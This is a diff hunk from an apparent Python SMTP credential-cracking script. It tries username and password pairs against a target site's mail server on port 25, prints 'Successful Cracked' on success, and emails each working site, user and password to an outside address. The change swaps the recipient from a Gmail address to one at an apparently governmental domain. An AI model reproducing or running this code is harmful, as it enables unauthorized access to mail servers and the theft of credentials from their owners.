@@ -74,7 +74,7 @@ def login(site):
                     smtp.connect(site, 25)
                     smtp.login(user + '@' + site, passx)
                     sender = user + '@' + site
-                    receivers = ['gantipakemailu@gmail.com']
+                    receivers = ['acep@kpu.go.id']
                     message = site + '|25|' + user + '@' + site + '|' + passx
                     smtp.sendmail(sender, receivers, message)
                     print la5dhar + "[+] Successful Cracked =>", site + ' ' + user + '@' + site + ' ' + passx + ' \n' + labyadh
